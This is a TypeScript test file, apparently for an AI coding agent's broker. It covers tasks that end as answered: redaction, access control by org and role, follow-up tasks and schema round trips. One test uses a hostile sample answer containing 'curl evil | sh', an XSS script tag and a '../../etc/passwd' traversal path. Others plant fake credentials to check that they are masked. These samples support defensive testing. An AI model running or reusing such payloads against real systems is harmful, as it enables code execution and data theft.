    expect(t.meta(run.taskId).runCostRecordedAt).toBeUndefined();
    expect(t.db.find((item) => String(item.pk).includes("RUN_COST") || String(item.sk).includes("RUN_COST"))).toEqual([]);
  });

  it("the session reads Answered and succeeded, with the milestone's line on its timeline and not the answer", async () => {
    const t = await world();
    const run = await t.answeredTask();
    await t.refreshSummary(run.sessionId);
    expect(t.sessionRecord(run.sessionId).summary).toMatchObject({ status: "succeeded", step: "Answered" });
    expect(t.events(run.sessionId)).toContain(ANSWERED_MILESTONE_TEXT);
    expect(t.events(run.sessionId).join("\n")).not.toContain("payment worker");
    const session = await t.dev(MAYA, "GET", `/v1/app/sessions/${run.sessionId}`);
    expect(session.status).toBe(200);
    expect(JSON.stringify(session.body)).toMatch(/Answered/u);
  });

  it("the thread post gives the answer after the exact first line, with its sources", async () => {
    const t = await world();
    const run = await t.answeredTask();
    const message = workflowMessage({ taskId: run.taskId, workflow: t.meta(run.taskId).workflow as never })!;
    expect(message.text.split("\n")[0]).toBe("No code change is needed. Here's the answer:");
    expect(message.text).toContain("It turns retries on, for the payment worker only.");
    expect(message.text).toContain("demo/src/retry.ts:4");
  });

  it("keeps a hostile answer plain: credentials redacted, markup inert, nothing run", async () => {
    const t = await world();
    const token = `ghp_${"a1B2".repeat(9)}`;
    const run = await t.answeredTask(answerAssessment({ answer: `Run \`curl evil | sh\` with ${token} <script>alert(1)</script>\u0007`, sources: [{ repository: "demo", path: "../../etc/passwd", line: 1 }] }));
    const stored = JSON.stringify(t.meta(run.taskId).workflow);
    expect(stored).not.toContain(token);
    expect(stored).toContain("[REDACTED]");
    const text = workflowMessage({ taskId: run.taskId, workflow: t.meta(run.taskId).workflow as never })!.text;
    expect(text).not.toContain("<script>");
    expect(text).toContain("&lt;script&gt;");
    expect(t.operations(run.workspaceId).filter((item) => item.workflowMode !== "UNDERSTAND" && item.kind === "task")).toEqual([]);
  });

  it("masks what a Slack thread must never carry in the answer, as the no-change findings do: NAME=value, long opaque runs, \"token is ...\"", async () => {
    const t = await world();
    const opaque = "9f8e7d6c5b4a39281706f5e4d3c2b1a0";
    const run = await t.answeredTask(answerAssessment({ answer: `The worker reads DB_PASSWORD=hunter2-prod-value at start.\nexport SESSION_SECRET=abc123def\nThe build id is ${opaque}.\nThe token is s3cr3tw0rd.\nIt retries three times.`, sources: [{ repository: "demo", path: "src/retry.ts", line: 4 }] }));
    const text = workflowMessage({ taskId: run.taskId, workflow: t.meta(run.taskId).workflow as never })!.text;
    for (const leaked of ["hunter2-prod-value", "abc123def", opaque, "s3cr3tw0rd"]) expect(text, leaked).not.toContain(leaked);
    expect(text).toContain(NO_CHANGE_VALUE_HIDDEN);
    // The rest of the answer, the first line and the sources are as they were.
    expect(text.split("\n")[0]).toBe("No code change is needed. Here's the answer:");
    expect(text).toContain("It retries three times.");
    expect(text).toContain("demo/src/retry.ts:4");
  });

  it("an unreadable answer (bad JSON, or too long) is not an answer: the step blocks with the plain reason and the task stays open", async () => {
    const t = await world();
    const run = await t.understanding();
    await t.finishUnderstand(run, { kind: "answer", restatement: "x", answer: "y".repeat(4001), sources: [] });
    expect(t.meta(run.taskId).workflow).toMatchObject({ stage: "UNDERSTAND", state: "BLOCKED" });
    expect(t.meta(run.taskId).workflow.outcome).toBeUndefined();
  });

  it("a version 1 task is untouched: it has no Understand, and the production flag off keeps a version 2 org's starts as they were", async () => {
    const off = await world({ live: false });
    const run = await off.start({ path: "QUICK" });
    expect(off.meta(run.taskId).workflow).toMatchObject({ stage: "PLAN" });
    expect(off.operationOf(run.workspaceId, "UNDERSTAND")).toBeUndefined();
  });

  it("only people with access see the answer: a person in another org reads the session and the task as missing, with nothing of the answer in what they are told", async () => {
    const t = await world({ orgs: true });
    const run = await t.answeredTask();
    for (const path of [`/v1/app/sessions/${run.sessionId}`, `/v1/dev/tasks/${run.taskId}`, `/v1/app/sessions/${run.sessionId}/events`]) {
      const other = await t.dev(OMAR, "GET", path);
      expect(other.status, path).toBe(404);
      expect(JSON.stringify(other.body), path).not.toContain("payment worker");
    }
    // The owner reads it.
    const mine = await t.dev(MAYA, "GET", `/v1/app/sessions/${run.sessionId}`);
    expect(mine.status).toBe(200);
    // A client that does not ask for the version 2 view (this one sends no header) reads the task as it always has: closed, with no answer in it.
    expect(JSON.stringify(mine.body)).toContain('"step":"Answered"');
    expect(JSON.stringify(mine.body)).toContain('"outcome":"CLOSED"');
  });
});

describe("a plan that says no change is needed, through the broker", () => {
  it("waits at plan review; Close as answered ends it ANSWERED, once, with the end told `answered`, the milestone written and the workspace given back", async () => {
    listen();
    const t = await world();
    const run = await t.noChangePlan();
    expect(t.meta(run.taskId).workflow.pullRequests ?? []).toEqual([]);
    const closed = await t.decide(MAYA, run.taskId, { decision: "REJECT", reason: CLOSED_AS_ANSWERED_REASON, artifactDigest: run.digest, closeAsAnswered: true });
    expect(closed.status, JSON.stringify(closed.body)).toBe(200);
    const task = t.meta(run.taskId);
    expect(task.workflow).toMatchObject({ stage: "CLOSED", state: "COMPLETE", outcome: "ANSWERED" });
    expect(workflowAnswer(task.workflow as never)).toMatchObject({ answer: noChange().answer });
    expect(task.workflow.artifacts.map((artifact) => artifact.type)).toEqual(["plan", "answer"]);
    expect(task.releasedAt).toBeDefined();
    expect(ended.filter((event) => event.taskId === run.taskId).map((event) => event.outcome)).toEqual(["answered"]);
    expect(t.milestones(run.taskId)).toHaveLength(1);
    // The same request again answers the same and writes nothing more.
    const again = await t.decide(MAYA, run.taskId, { requestId: task.workflow.decisions.at(-1)!.requestId, expectedRevision: task.workflow.revision - 1, decision: "REJECT", reason: CLOSED_AS_ANSWERED_REASON, artifactDigest: run.digest, closeAsAnswered: true });
    expect(again.status).toBe(200);
    expect(t.milestones(run.taskId)).toHaveLength(1);
    expect(ended.filter((event) => event.taskId === run.taskId)).toHaveLength(1);
  });

  it("only the owner closes it as answered: another person is refused as for any plan decision, and nothing changes", async () => {
    const t = await world();
    const run = await t.noChangePlan();
    await t.member(MIA, "developer");
    const refused = await t.decide(MIA, run.taskId, { decision: "REJECT", reason: CLOSED_AS_ANSWERED_REASON, artifactDigest: run.digest, closeAsAnswered: true });
    expect(refused.status).toBeGreaterThanOrEqual(400);
    expect(t.meta(run.taskId).workflow).toMatchObject({ stage: "PLAN_REVIEW", state: "WAITING" });
  });

  it("a plan that does not say it cannot be closed as answered", async () => {
    const t = await world();
    const run = await t.understanding();
    await t.finishUnderstand(run, ready());
    const plan = t.operationOf(run.workspaceId, "PLAN")!;
    await t.artifact(run.workspaceId, String(plan.id), "plan.md", planAnswer(planDocument({ claims: [
      { id: "1", text: "Payments that fail with a timeout are retried.", evidence: [{ kind: "code", path: "payments/src/charge.ts", startLine: 10, endLine: 24, note: "Today a timeout throws." }] },
      { id: "2", text: "A test proves a timed-out payment is retried once and never charged twice." },
    ] }), { checks: { checks: [], none_reason: "Nothing runs." } }));
    await t.finish(run.workspaceId, String(plan.id), "SUCCEEDED", { result: { workflowMode: "PLAN" } });
    // An ordinary coding plan is checked by a second model before its owner sees it (Task 8); a plan that says no change is needed is not (Task 4).
    expect(t.meta(run.taskId).workflow).toMatchObject({ stage: "PLAN_CRITIQUE" });
    const check = t.operationOf(run.workspaceId, "PLAN_CRITIQUE")!;
    await t.artifact(run.workspaceId, String(check.id), "plan-critique.md", `I read the plan.\n\n\`\`\`rovara-plan-critique\n{"verdict":"ok","points":[]}\n\`\`\`\n`);
    await t.finish(run.workspaceId, String(check.id), "SUCCEEDED", { result: { workflowMode: "PLAN_CRITIQUE" } });
    expect(t.meta(run.taskId).workflow).toMatchObject({ stage: "PLAN_REVIEW", state: "WAITING" });
    const digest = t.meta(run.taskId).workflow.artifacts.at(-1)!.sha256;
    const refused = await t.decide(MAYA, run.taskId, { decision: "REJECT", reason: CLOSED_AS_ANSWERED_REASON, artifactDigest: digest, closeAsAnswered: true });
    expect(refused.status).toBe(400);
    expect(errorOf(refused).message).toMatch(/does not say that no change is needed/);
    expect(t.meta(run.taskId).workflow).toMatchObject({ stage: "PLAN_REVIEW", state: "WAITING" });
  });

  it("Make a change anyway sends the plan back with the note, and the task goes on to plan again", async () => {
    const t = await world();
    const run = await t.noChangePlan();
    const sent = await t.decide(MAYA, run.taskId, { decision: "REQUEST_CHANGES", reason: CHANGE_ANYWAY_NOTE, artifactDigest: run.digest });
    expect(sent.status, JSON.stringify(sent.body)).toBe(200);
    expect(t.meta(run.taskId).workflow).toMatchObject({ outcome: "CHANGES_REQUESTED" });
    expect(t.meta(run.taskId).workflow.decisions.at(-1)).toMatchObject({ decision: "REQUEST_CHANGES", reason: "Make the change anyway." });
    const planning = t.operationOf(run.workspaceId, "PLAN")!;
    expect(t.invocationOf(String(planning.id)).payload.prompt).toContain("Make the change anyway.");
  });

  it("the planning prompt offers noChangeNeeded to a version 2 task only: a version 1 task's prompt is as it was", async () => {
    const t = await world();
    const run = await t.understanding();
    await t.finishUnderstand(run, ready());
    expect(t.invocationOf(String(t.operationOf(run.workspaceId, "PLAN")!.id)).payload.prompt).toContain("noChangeNeeded");
    // An org still on version 1 starts a 1.0.0 task at the plan step.
    t.db.set({ ...builtinSettingsKey(TEST_ORG, "rovara-code"), entityType: "BUILTIN_AGENT_SETTINGS", pinnedVersion: 1, updatedBy: "test", updatedAt: NOW });
    const old = await t.start({ path: "QUICK" });
    await t.finish(old.workspaceId, String(t.operations(old.workspaceId).find((item) => item.kind === "prepare")!.id), "SUCCEEDED", PREPARED);
    expect(t.meta(old.taskId).workflow).toMatchObject({ definitionVersion: "1.0.0", stage: "PLAN" });
    const planning = t.operationOf(old.workspaceId, "PLAN")!;
    expect(t.invocationOf(String(planning.id)).payload.prompt).not.toContain("noChangeNeeded");
  });
});

describe("Make a change anyway after an answer", () => {
  it("refuses to start a follow-up for a session that now runs on a Mac, like the other session controls do, and starts nothing", async () => {
    const t = await world();
    const run = await t.answeredTask();
    t.db.set({ ...(t.sessionRecord(run.sessionId) as Record<string, unknown>), where: { kind: "mac", deviceId: "dvc_0123456789abcdefghij", label: "Maya's MacBook" } });
    const tasksBefore = t.db.find((item) => String(item.pk).startsWith("DEVTASK#") && item.sk === "META").length;
    const reply = await t.changeAnyway(MAYA, run.sessionId);
    expect(reply.status).toBeGreaterThanOrEqual(400);
    expect((reply.body.error as { message: string }).message).toBe(SESSION_ON_MAC_FOLLOW_UP_MESSAGE);
    expect(t.db.find((item) => String(item.pk).startsWith("DEVTASK#") && item.sk === "META")).toHaveLength(tasksBefore);
  });

  it("starts a NEW task for the caller with the same request and path, the earlier answer as context and a link to the old task; the caller pays", async () => {
    const t = await world();
    const run = await t.answeredUnderChosenPath("FULL");
    const reply = await t.changeAnyway(MAYA, run.sessionId);
    expect(reply.status, JSON.stringify(reply.body)).toBe(202);
    const created = reply.body.task as { taskId: string };
    expect(created.taskId).not.toBe(run.taskId);
    const next = t.meta(created.taskId);
    expect(next.retryOfTaskId).toBe(run.taskId);
    expect(next.requestText).toContain("What does the retry flag do?");
    expect(next.requestText).toContain("It turns retries on, for the payment worker only.");
    expect(next.workflow).toMatchObject({ path: "FULL", stage: "UNDERSTAND", intent: { pathFrom: "request" } });
    expect(next.developerId).toBe(MAYA.developerId);
    expect(next.payer).toMatchObject({ kind: "member", developerId: MAYA.developerId });
    // The old task is as it was.
    expect(t.meta(run.taskId).workflow).toMatchObject({ outcome: "ANSWERED" });
  });

  it("repeats safely: the same request id answers the same task, and writes no second one", async () => {
    const t = await world();
    const run = await t.answeredTask();
    const requestId = randomUUID();
    const first = await t.changeAnyway(MAYA, run.sessionId, { requestId });
    const second = await t.changeAnyway(MAYA, run.sessionId, { requestId });
    expect(first.status).toBe(202);
    expect(second.status).toBe(202);
    expect((second.body.task as { taskId: string }).taskId).toBe((first.body.task as { taskId: string }).taskId);
    expect(t.db.find((item) => item.entityType === "DEVELOPER_TASK" && item.retryOfTaskId === run.taskId)).toHaveLength(1);
  });

  it("tells Understand the person has read the answer, and a second `answer` becomes a ready plan instead of another Answered", async () => {
    const t = await world();
    const run = await t.answeredTask();
    const reply = await t.changeAnyway(MAYA, run.sessionId);
    const taskId = (reply.body.task as { taskId: string }).taskId;
    const workspaceId = t.meta(taskId).workspaceId;
    await t.finish(workspaceId, String(t.operations(workspaceId).find((item) => item.kind === "prepare")!.id), "SUCCEEDED", PREPARED);
    const understand = t.operationOf(workspaceId, "UNDERSTAND")!;
    expect(t.invocationOf(String(understand.id)).payload.prompt).toContain(CHANGE_ANYWAY_RULE);
    await t.finishUnderstand({ workspaceId, operationId: String(understand.id) }, answerAssessment());
    expect(t.meta(taskId).workflow).toMatchObject({ stage: "PLAN" });
    expect(t.meta(taskId).workflow.outcome).toBeUndefined();
    expect(t.operationOf(workspaceId, "PLAN")).toBeDefined();
  });

  it("an ordinary task's Understand prompt does not carry the rule", () => {
    expect(understandPrompt({ requestText: "x", intent: undefined, notes: "" })).not.toContain(CHANGE_ANYWAY_RULE);
    expect(understandPrompt({ requestText: "x", intent: undefined, notes: "", changeAnyway: true })).toContain(CHANGE_ANYWAY_RULE);
    expect(understandPrompt({ requestText: "x", intent: undefined, notes: "", changeAnyway: true, forPlan: true })).not.toContain(CHANGE_ANYWAY_RULE);
  });

  it("a person with \"can use\" on the session can ask, and pays", async () => {
    const t = await world();
    await t.member(ARJUN, "developer");
    const run = await t.answeredTask();
    await t.share(run.sessionId, ARJUN, "use");
    const allowed = await t.changeAnyway(ARJUN, run.sessionId);
    expect(allowed.status, JSON.stringify(allowed.body)).toBe(202);
    const task = t.meta((allowed.body.task as { taskId: string }).taskId);
    expect(task).toMatchObject({ developerId: ARJUN.developerId, retryOfTaskId: run.taskId });
    expect(task.payer).toMatchObject({ kind: "member", developerId: ARJUN.developerId });
  });

  it("the session's own level gate refuses a viewer of the project and a person who may only view, each with SESSION_LEVEL_REQUIRED, and starts nothing", async () => {
    const t = await world();
    await t.member(MAX, "viewer");
    await t.member(MIA, "developer");
    const run = await t.answeredTask();
    await t.share(run.sessionId, MAX, "use");
    await t.share(run.sessionId, MIA, "view");
    const before = t.db.find((item) => item.entityType === "DEVELOPER_TASK").length;
    for (const who of [MAX, MIA]) {
      const refused = await t.changeAnyway(who, run.sessionId);
      expect(refused.status, who.name).toBe(403);
      expect(errorOf(refused).code, who.name).toBe("SESSION_LEVEL_REQUIRED");
    }
    expect(t.db.find((item) => item.entityType === "DEVELOPER_TASK").length).toBe(before);
  });

  it("startTask's own check shows on its own: the session's owner passes the level gate, and one who is now only a viewer of the project is refused PROJECT_ACCESS_DENIED, with nothing written", async () => {
    const t = await world();
    const run = await t.answeredTask();
    await t.member(MAYA, "viewer");
    const before = t.db.find((item) => item.entityType === "DEVELOPER_TASK").length;
    const refused = await t.changeAnyway(MAYA, run.sessionId);
    expect(refused.status).toBe(403);
    expect(errorOf(refused).code).toBe("PROJECT_ACCESS_DENIED");
    expect(t.db.find((item) => item.entityType === "DEVELOPER_TASK").length).toBe(before);
  });

  it("the same for an owner whose project role was removed: PROJECT_ACCESS_DENIED from the start, nothing written", async () => {
    const t = await world();
    const run = await t.answeredTask();
    await t.member(MAYA, undefined);
    t.db.delete(projectMemberKey(TEST_ORG, MAYA.developerId, "payments").pk, projectMemberKey(TEST_ORG, MAYA.developerId, "payments").sk);
    const refused = await t.changeAnyway(MAYA, run.sessionId);
    expect(errorOf(refused).code).toBe("PROJECT_ACCESS_DENIED");
    expect(t.db.find((item) => item.entityType === "DEVELOPER_TASK" && item.retryOfTaskId === run.taskId)).toEqual([]);
  });

  it("a person with \"can use\" who lost their project role is refused too, with nothing written", async () => {
    const t = await world();
    await t.member(ARJUN, "developer");
    const run = await t.answeredTask();
    await t.share(run.sessionId, ARJUN, "use");
    t.db.delete(projectMemberKey(TEST_ORG, ARJUN.developerId, "payments").pk, projectMemberKey(TEST_ORG, ARJUN.developerId, "payments").sk);
    const refused = await t.changeAnyway(ARJUN, run.sessionId);
    expect(errorOf(refused).code).toBe("PROJECT_ACCESS_DENIED");
    expect(t.db.find((item) => item.entityType === "DEVELOPER_TASK" && item.retryOfTaskId === run.taskId)).toEqual([]);
  });

  it("does not force the old task's default path: when the request named none, Understand chooses again (and may choose Full); when the request named one, it is kept", async () => {
    const t = await world();
    const run = await t.answeredTask();
    expect(t.meta(run.taskId).workflow.intent).toMatchObject({ pathFrom: "understand" });
    const reply = await t.changeAnyway(MAYA, run.sessionId);
    const taskId = (reply.body.task as { taskId: string }).taskId;
    expect(t.meta(taskId).workflow).toMatchObject({ stage: "UNDERSTAND", intent: { pathFrom: "understand" } });
    const workspaceId = t.meta(taskId).workspaceId;
    await t.finish(workspaceId, String(t.operations(workspaceId).find((item) => item.kind === "prepare")!.id), "SUCCEEDED", PREPARED);
    await t.finishUnderstand({ workspaceId, operationId: String(t.operationOf(workspaceId, "UNDERSTAND")!.id) }, { ...ready(), path: "FULL" });
    expect(t.meta(taskId).workflow).toMatchObject({ stage: "PLAN", path: "FULL", reviewPhase: "REQUIREMENTS" });
    // A path the person named for the first request is the one they asked for, and it stays.
    const named = await t.answeredUnderChosenPath("QUICK");
    const again = await t.changeAnyway(MAYA, named.sessionId);
    expect(t.meta((again.body.task as { taskId: string }).taskId).workflow).toMatchObject({ path: "QUICK", intent: { pathFrom: "request" } });
  });

  it("is refused for a session that did not end Answered, for another org's or a missing session, and carries nothing from the body but the request id", async () => {
    const t = await world();
    const open = await t.understanding();
    const notAnswered = await t.changeAnyway(MAYA, open.sessionId);
    expect(notAnswered.status).toBe(400);
    expect(errorOf(notAnswered)).toMatchObject({ code: "CONFIG_INVALID", message: NOT_ANSWERED_MESSAGE });
    const run = await t.answeredTask();
    const forged = await t.changeAnyway(MAYA, run.sessionId, { payer: { kind: "project", project: "payments" }, retryOf: randomUUID(), path: "FULL" });
    expect(forged.status).toBe(400);
    const missing = await t.changeAnyway(MAYA, "ses_zzzzzzzzzzzzzzzzzzzz");
    expect(missing.status).toBe(404);
    const outsider = await world({ orgs: true });
    const theirs = await outsider.answeredTask();
    expect((await outsider.changeAnyway(OMAR, theirs.sessionId)).status).toBe(404);
  });
});

describe("a build that changes nothing after approval still blocks", () => {
  it("approving a plan that said no change was needed and building nothing blocks with noCodeChanged: the answer path is not a build, and a build is not an answer", async () => {
    const t = await world();
    const run = await t.noChangePlan();
    const approved = await t.decide(MAYA, run.taskId, { decision: "APPROVE", reason: "Approved", artifactDigest: run.digest });
    expect(approved.status, JSON.stringify(approved.body)).toBe(200);
    const build = t.operationOf(run.workspaceId, "IMPLEMENT")!;
    expect(build).toBeDefined();
    await t.finish(run.workspaceId, String(build.id), "FAILED", { error: WORKFLOW_NO_CODE_CHANGE_MESSAGE });
    expect(t.meta(run.taskId).workflow).toMatchObject({ stage: "IMPLEMENT", state: "BLOCKED", blockReason: WORKFLOW_BLOCK_REASONS.noCodeChanged });
    expect(t.meta(run.taskId).workflow.outcome).not.toBe("ANSWERED");
  });

  it("is a stop for a person, not a FAILED task with the worker's config wording: the task view and the session agree (staging 0.4.10, bug B)", async () => {
    const t = await world();
    const run = await t.noChangePlan();
    await t.decide(MAYA, run.taskId, { decision: "APPROVE", reason: "Approved", artifactDigest: run.digest });
    const build = t.operationOf(run.workspaceId, "IMPLEMENT")!;
    await t.finish(run.workspaceId, String(build.id), "FAILED", { error: `CONFIG_INVALID: ${WORKFLOW_NO_CODE_CHANGE_MESSAGE}` });
    const task = (await t.dev(MAYA, "GET", `/v1/dev/tasks/${run.taskId}`)).body.task as { status: string; failure?: { message: string }; workflow: { state: string; blockReason?: string } };
    expect(task.workflow).toMatchObject({ state: "BLOCKED", blockReason: WORKFLOW_BLOCK_REASONS.noCodeChanged });
    expect(task.status).not.toBe("FAILED");
    expect(JSON.stringify(task)).not.toContain("CONFIG_INVALID");
    await t.refreshSummary(run.sessionId);
    expect(t.sessionRecord(run.sessionId).summary.status).toBe("needs_person");
  });

  it("any other failed build is still a FAILED task (positive control)", async () => {
    const t = await world();
    const run = await t.noChangePlan();
    await t.decide(MAYA, run.taskId, { decision: "APPROVE", reason: "Approved", artifactDigest: run.digest });
    await t.finish(run.workspaceId, String(t.operationOf(run.workspaceId, "IMPLEMENT")!.id), "FAILED", { error: "RUNTIME_UNAVAILABLE: the model call failed: provider-outage attempt 4; retry the step" });
    const task = (await t.dev(MAYA, "GET", `/v1/dev/tasks/${run.taskId}`)).body.task as { status: string };
    expect(task.status).toBe("FAILED");
  });
});

describe("retryOf is checked, not trusted", () => {
  const starter = async (t: Awaited<ReturnType<typeof world>>) => {
    const { createCodeIntentStarter } = await import("../../packages/broker/src/aws/broker.js");
    return createCodeIntentStarter(t.brokerInput as never);
  };
  const intent = (retryOf: string) => ({ requestId: randomUUID(), project: "payments", input: { text: "Make it so" }, source: "app", retryOf });
  const refused = async (promise: Promise<unknown>) => promise.then(() => undefined, (error: { code?: string; message: string }) => ({ code: error.code, message: error.message.replace(`${String(error.code)}: `, "") }));

  it("accepts the task an answered, visible session of the caller's org belongs to", async () => {
    const t = await world();
    const run = await t.answeredTask();
    const start = await starter(t);
    const result = await start(TEST_ORG, MAYA.developerId, intent(run.taskId)) as { task: { taskId: string } };
    expect(t.meta(result.task.taskId).retryOfTaskId).toBe(run.taskId);
  });

  it("refuses, with the one plain message, a task that does not exist, one that has not ended Answered, one that ended another way, and another org's answered task; nothing is started", async () => {
    const t = await world({ orgs: true });
    const open = await t.understanding();
    const rejected = await t.noChangePlan();
    await t.decide(MAYA, rejected.taskId, { decision: "REJECT", reason: "No.", artifactDigest: rejected.digest });
    expect(t.meta(rejected.taskId).workflow).toMatchObject({ outcome: "REJECTED" });
    // An answered task of another org: a copy of one, filed under org B.
    const mine = await t.answeredTask();
    const theirs = { taskId: randomUUID() };
    t.db.set({ ...(t.db.get(`DEVTASK#${mine.taskId}`, "META") as Record<string, unknown>), pk: `DEVTASK#${theirs.taskId}`, taskId: theirs.taskId, orgId: ORG_B });
    const start = await starter(t);
    const before = t.db.find((item) => item.entityType === "DEVELOPER_TASK").length;
    for (const id of [randomUUID(), open.taskId, rejected.taskId, theirs.taskId]) {
      expect(await refused(start(TEST_ORG, MAYA.developerId, intent(id))), id).toEqual({ code: "CONFIG_INVALID", message: FOLLOW_UP_UNAVAILABLE_MESSAGE });
    }
    expect(t.db.find((item) => item.entityType === "DEVELOPER_TASK").length).toBe(before);
  });

  it("refuses a task of another org for a caller in this one's neighbour org", async () => {
    const t = await world({ orgs: true });
    const run = await t.answeredTask();
    const start = await starter(t);
    expect(await refused(start(ORG_B, OMAR.developerId, intent(run.taskId)))).toEqual({ code: "CONFIG_INVALID", message: FOLLOW_UP_UNAVAILABLE_MESSAGE });
  });

  it("the check itself: true for the owner of an answered task, false for a person who cannot see its session or is not in its org, false for one that is not answered", async () => {
    const t = await world();
    const run = await t.answeredTask();
    const open = await t.understanding();
    const { createCodeIntentDependencies } = await import("../../packages/broker/src/aws/broker.js");
    const callerOf = (who: Developer, orgId: string) => ({ developerId: who.developerId, sessionId: who.sessionId, amr: who.provider, name: who.name, orgId: orgId as never, orgRole: "member" as const });
    const mine = createCodeIntentDependencies(t.brokerInput as never, callerOf(MAYA, TEST_ORG))!;
    expect(await mine.retryable!(callerOf(MAYA, TEST_ORG), run.taskId)).toBe(true);
    expect(await mine.retryable!(callerOf(MAYA, TEST_ORG), open.taskId)).toBe(false);
    // Signed in but not a member of the org, so the session reads as missing to them.
    expect(await mine.retryable!(callerOf(MIA, TEST_ORG), run.taskId)).toBe(false);
    expect(await mine.retryable!(callerOf(MAYA, ORG_B), run.taskId)).toBe(false);
  });

  it("only an app intent can follow a task: the schema refuses retryOf from any other source", () => {
    const base = { requestId: randomUUID(), project: "payments", input: { text: "x" }, retryOf: randomUUID() };
    expect(CodeIntentRequestSchema.safeParse({ ...base, source: "app" }).success).toBe(true);
    for (const source of ["cli", "mcp", "offer"]) expect(CodeIntentRequestSchema.safeParse({ ...base, source }).success, source).toBe(false);
  });
});

// A chain step that ends Answered pauses for a person (owner ruling): see rovara-code-answered-chain.test.ts.

// ---- round trip (bug E): what the broker really answers, read by the schema each client reads it with

describe("round trip: the answers after an Answered task, as the broker sends them", () => {
  it("POST …/change-anyway answers 202 { task }, which the clients' task schema reads; the Answered task's session reads too", async () => {
    const t = await world();
    const run = await t.answeredUnderChosenPath("FULL");
    const reply = await t.changeAnyway(MAYA, run.sessionId);
    expect(reply.status, JSON.stringify(reply.body)).toBe(202);
    expect(typeof reply.body.requestId, "every /v1/app answer carries the gateway's requestId").toBe("string");
    const task = DeveloperTaskResponseSchema.safeParse(reply.body);
    expect(task.success, JSON.stringify(task.error?.issues)).toBe(true);
    for (const headers of [{ "x-agentx-task-view": "2" }, {}]) {
      const session = await t.dev(MAYA, "GET", `/v1/app/sessions/${run.sessionId}`, undefined, headers);
      expect(session.status).toBe(200);
      const read = SessionResponseReaderSchema.safeParse(session.body);
      expect(read.success, JSON.stringify(read.error?.issues)).toBe(true);
      const answered = await t.dev(MAYA, "GET", `/v1/dev/tasks/${run.taskId}`, undefined, headers);
      const parsed = DeveloperTaskResponseSchema.safeParse(answered.body);
      expect(parsed.success, JSON.stringify(parsed.error?.issues)).toBe(true);
    }
  });
});

// ---- R1b: the web app reads the answer from the task view

describe("the answer in the task view the web app reads", () => {
  const HEADER = { "x-agentx-task-view": "2" };
  const secretAnswer = () => answerAssessment({ answer: "The worker reads DB_PASSWORD=hunter2-prod-value at start.\nIt retries three times.", sources: [{ repository: "demo", path: "src/retry.ts", line: 4 }] });
  const answerOf = (reply: { body: Record<string, unknown> }) => {
    const session = reply.body.session as { body: { task: { status: string; workflow: { outcome?: string; intent?: { assessment?: { kind: string; answer?: string; sources?: unknown } } } } } };
    return session.body.task.workflow;
  };

  it("carries the answer and its sources to a reader who asks for the version 2 view, with a credential already redacted", async () => {
    const t = await world();
    const run = await t.answeredTask(secretAnswer());
    const read = await t.dev(MAYA, "GET", `/v1/app/sessions/${run.sessionId}`, undefined, HEADER);
    expect(read.status).toBe(200);
    const workflow = answerOf(read);
    expect(workflow.outcome).toBe("ANSWERED");
    expect(workflow.intent?.assessment).toMatchObject({ kind: "answer", sources: [{ repository: "demo", path: "src/retry.ts", line: 4 }] });
    const answer = workflow.intent!.assessment!.answer!;
    expect(answer).toContain("It retries three times.");
    // Redaction happens when the answer is kept (so the view, the stored task and "Make a change anyway" all hold the same words); the view adds nothing of its own to mask.
    expect(answer).toContain("DB_PASSWORD=[REDACTED]");
    expect(JSON.stringify(read.body)).not.toContain("hunter2-prod-value");
    expect(workflowAnswer(t.meta(run.taskId).workflow as never)!.answer).toBe(answer);
    // A client that does not ask for the version 2 view reads the task as it always has: closed, with no answer in it.
    const old = await t.dev(MAYA, "GET", `/v1/app/sessions/${run.sessionId}`);
    expect(answerOf(old).intent).toBeUndefined();
  });

  it("carries it to a person who may only view the session, and to nobody else", async () => {
    const t = await world({ orgs: true });
    await t.member(ARJUN);
    const run = await t.answeredTask(secretAnswer());
    expect((await t.share(run.sessionId, ARJUN, "view")).status).toBeLessThan(300);
    const viewer = await t.dev(ARJUN, "GET", `/v1/app/sessions/${run.sessionId}`, undefined, HEADER);
    expect(viewer.status).toBe(200);
    expect(answerOf(viewer).intent?.assessment?.answer).toContain("It retries three times.");
    const other = await t.dev(OMAR, "GET", `/v1/app/sessions/${run.sessionId}`, undefined, HEADER);
    expect(other.status).toBe(404);
    expect(JSON.stringify(other.body)).not.toContain("retries three times");
  });
});
